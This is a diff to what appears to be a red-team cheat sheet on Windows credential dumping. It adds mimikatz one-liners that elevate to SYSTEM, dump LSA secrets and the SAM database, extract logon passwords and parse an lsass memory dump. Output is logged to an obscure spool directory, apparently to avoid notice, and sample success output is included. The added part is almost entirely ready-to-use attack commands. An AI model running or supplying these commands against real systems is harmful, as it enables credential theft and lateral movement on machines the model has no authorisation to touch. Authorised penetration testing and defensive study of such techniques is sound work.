@@ -198,6 +198,38 @@ When in a non-interactive shell (e.g. PS-Session, sliver execute), run mimikatz 
 .\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
 ```
 
+Write output to a specific file:
+
+```cmd
+.\mimikatz.exe "privilege::debug" "token::elevate" "log c:\Windows\System32\spool\drivers\color\output.txt" "sekurlsa::logonpasswords" exit
+```
+
+Token elevation one-liners:
+
+```cmd
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" exit
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::minidump C:\Windows\System32\spool\drivers\color\lsass.dmp" exit
+```
+
+Interactive token elevation:
+
+```text
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # misc::cmd
+mimikatz # lsadump::sam
+```
+
+Useful indicators:
+
+```text
+token::elevate
+SID name  : NT AUTHORITY\SYSTEM
+
+misc::cmd
+Patch OK for 'cmd.exe'
+```
+
 ## Credential Manager and Vault
 
 When hunting for cached clear-text credentials, always run both of these:
